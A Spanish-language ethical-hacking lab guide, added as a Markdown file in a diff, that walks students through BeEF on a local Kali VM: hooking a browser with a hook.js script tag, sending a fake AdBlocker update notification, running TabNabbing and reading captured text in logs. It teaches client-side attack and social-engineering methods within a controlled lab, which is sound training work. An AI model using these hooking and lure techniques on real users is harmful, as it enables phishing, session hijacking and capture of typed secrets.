@@ -1,0 +1,91 @@
+# Práctica de laboratorio - Uso del marco de explotación del navegador (BeEF)
+
+## Objetivos
+El marco de explotación del navegador (BeEF) permite a los evaluadores de penetración realizar ataques del lado del cliente mediante el navegador web del objetivo. Los evaluadores de pruebas de penetración usan BeEF para “conectar” los navegadores web. De alguna manera, el atacante hace que un usuario ejecute un nombre de archivo JavaScript hook.js para tomar el control del navegador del usuario y lanzar más ataques contra el sistema objetivo desde el contexto del navegador. El guion malicioso se puede ejecutar de varias maneras, incluido el uso de un mensaje de suplantación de identidad (phishing) para hacer que un usuario vaya a una página web que lleva el script.
+- Cargar el entorno de la GUI de BeEF
+- Conectar el navegador local para simular un ataque del lado del cliente
+- Investigue las capacidades de aprovechamiento de BeEF
+
+## Trasfondo / Escenario
+En esta actividad, utilizará BeEF para conectar un navegador local y realizar una explotación basado en el navegador. Esta actividad se realiza en condiciones cuidadosamente controladas dentro de un entorno virtual. Las herramientas de BeEF solo deben usarse para pruebas de penetración en situaciones en las que tiene permiso por escrito para realizar explotaciones del lado del cliente.
+
+## Recursos necesarios
+- Curso Kali VM personalizado para hacker ético
+
+## Parte 1: Cargar el entorno de la GUI de BeEF
+__Paso 1: Iniciar BeEF__<br>
+Abra la aplicación BeEF desde la opción de menú Kali __Application > All Aplications > beef start__. La primera vez que se ejecute BeEF, se le pedirá que cambie la contraseña del usuario de BeEF. Ingrese _newbeef_ como contraseña.
+```bash
+┌──(kali㉿Kali)-[~]
+└─$ sudo beef-xss
+[sudo] password for kali:
+[-] You are using the Default credentials
+[-] (Password must be different from "beef")
+[-] Please type a new password for the beef user: newbeef
+```
+Al final del resultado del comando, BeEF indica que está abriendo la interfaz de usuario web de BeEF en una nueva ventana del navegador.
+```bash
+[*] Opening Web UI (http://127.0.0.1:3000/ui/panel) in: 5... 4... 3... 2... 1...
+```
+Se abrirá una ventana del navegador automáticamente. Esta es la interfaz de BeEF. Si no es así, abra Firefox e ingrese _http://127.0.0.1:3000/ui/authentication_ como URL. Inicie sesión en BeEF con el nombre de usuario _beef_ y la contraseña _newbeef_.
+
+__Paso 2: Conecte el navegador local para simular un ataque del lado del cliente__
+Para utilizar BeEF para aprovechar un sistema de destino, primero debe “conectar” el navegador de destino. Utilizará el sistema local como destino en esta práctica de laboratorio. Si estuviera ejecutando una prueba de penetración real, su reconocimiento identificaría las páginas web que el usuario puede visitar con frecuencia, como en un ataque de bebedero. Se utilizaría una de las páginas web más visitadas para entregar el código JavaScript. En esta práctica de laboratorio, utilizará una página web de demostración que se incluye con la aplicación BeEF.
+
+- Abra una nueva pestaña en su navegador Firefox. Ingrese la URL _http://127.0.0.1:3000/demos/butcher/index.html_.<br>
+La página web falsa se asemeja a una simple aplicación de escaparate de una tienda. Contiene código JavaScript que se ejecutará en el entorno del navegador cuando se cargue la página.
+- Utilice CTRL-U en Firefox para ver el código fuente de la página HTML que se muestra.
+- Estas líneas cargarán y ejecutarán el código para crear el gancho.
+<!-- Insertar el código fuente de la página web -->
+```HTML
+<script>
+	var commandModuleStr = '<script src="/hook.js" type="text/javascript"><\/script>';
+	document.write(commandModuleStr);
+</script>
+```
+- Regrese a la ventana del navegador que contiene el __BeEF Control Panel__. Observe que la información del panel __Hooked Browsers__ en el lado izquierdo de la pantalla ha cambiado.
+- Haga clic en la entrada enumerada en __Online Browsers__
+- Aparecen seis fichas debajo de la opción __Current Browser__
+  - Details
+  - Logs
+  - Commands
+  - Proxy
+  - XssRays
+  - Network
+
+## Parte 2: Investigar las capacidades de aprovechamiento de BeEF
+
+__Paso 1: Investigar los comandos y las pestañas de red__<br>
+En este paso, investigará dos de las pestañas que aparecen para el navegador interno enganchado. Utilice Internet para investigar las capacidades de las otras pestañas.
+
+- Haga clic en la ficha Commands. Esta pestaña es donde se pueden ejecutar los módulos en el navegador de destino. Expanda las categorías de comandos en el panel Module Tree. Observe los iconos codificados por colores junto a cada función. Estos iconos se denominan “semáforos”.
+Cada módulo de comando tiene un icono de semáforo, que se utiliza para indicar lo siguiente:
+
+| Color     | Significado                                                                                   |
+|-----------|-----------------------------------------------------------------------------------------------|
+| Verde     | El módulo de comando funciona contra el objetivo y debe ser invisible para el usuario.        |
+| Naranja   | El módulo de comando funciona contra el objetivo, pero puede ser visible para el usuario.     |
+| Blanco    | El módulo de comando aún no se ha verificado con este objetivo.                               |
+| Rojo      | El módulo de comando no funciona con este objetivo.                                           |
+
+- Haga clic en la pestaña _Network_. La consola de BeEF crea un mapa de red que muestra la topología de la red actual. Las otras pestañas de esta categoría son Hosts y Services. Debido a que está trabajando solo en un entorno local, el mapa de red solo mostrará una red y un host.
+
+__Paso 2: Utilice BeEF para iniciar un ataque de ingeniería social__<br>
+En este paso, enviará un mensaje de alerta falso a la ventana del navegador enganchado para incitar al usuario a descargar e instalar un complemento malicioso.
+
+- Haga clic en la ficha _Commands_ en el BeEF Control Panel. Desplácese hasta la categoría BeEF Control Panel. Abrir la categoría. Seleccione la opción __Fake Notification Bar (Firefox)__ de la lista de módulos. La URL predeterminada del complemento malicioso se muestra junto con el mensaje que se mostrará en la ventana del navegador. La explotación hará que se muestre una alerta en el navegador. Si el usuario hace clic en el botón de instalación del complemento falso, se lo dirigirá a la URL que se indica.
+- Cambie la URL del complemento por http://10.6.6.13/. Esta URL redirige al usuario a la pantalla de inicio de sesión del servidor virtual de DVWA. La URL puede apuntar a cualquier página web, ya sea almacenada localmente o en la red. En un entorno de pruebas de penetración en vivo, esto sería un sitio web clonado, la descarga de una aplicación maliciosa o una página web que contiene un guion malicioso.
+- Cambie el texto de la alerta para que diga La extensión de seguridad de AdBlocker está desactualizada. Instale la nueva versión ahora. Haga clic en _Execute_ para enviar la alerta a la ventana del navegador conectado.
+- Regrese a la pestaña del navegador que muestra la página web falsa The Butcher. Hay un mensaje de alerta en el área del banner de Firefox. Haga clic en el botón __Install Plug-in__ en el banner de alerta.
+
+__Paso 3: Usar TabNabbing para mostrar un sitio web malicioso__<br>
+TabNabbing es una función que redirige al usuario a una URL diferente si una pestaña del navegador de un navegador enganchado está inactiva durante un período de tiempo específico.
+
+- Abra una nueva instancia de Firefox. Navegue hasta la pantalla de inicio de sesión de BeEF mediante la URL http://127.0.0.1:3000/ui/authentication. Inicie sesión con el nombre de usuario de beefy la contraseña de newbeef.
+- Abra una nueva pestaña y vuelva a la página web de The Butcher en http://127.0.0.1:3000/demos/butcher/index.html.
+- Regrese a la ficha BeEF Control Panel. Seleccione la instancia enumerada en Online Browsers en el panel Hooked Browsers. Abra la ficha Commands.
+- Expanda la categoría Social Engineering. Desplácese hacia abajo y seleccione TabNabbing.
+- Cambie la cantidad de minutos a _1_. Haga clic en el botón __Execute__ para iniciar la explotación. Permanezca inactivo durante al menos un minuto.
+- Regrese a la pestaña que mostró la página web _The Butcher_.
+- En el cuadro en el centro de la pantalla de demostración básica de BeEF, escriba "Este es mi secreto". Regrese a la fiche BeEF Control Panel. Con la entrada seleccionada en _Navegadores en línea_, seleccione _Logs_ en la barra de menús.
+BeEF registra la actividad realizada en el navegador conectado. El texto recopilado en la pantalla __Basic Demo__ se muestra en texto sin cifrar. Toda la actividad, incluidos los clics del mouse y la navegación, se registran en los logs (registros).
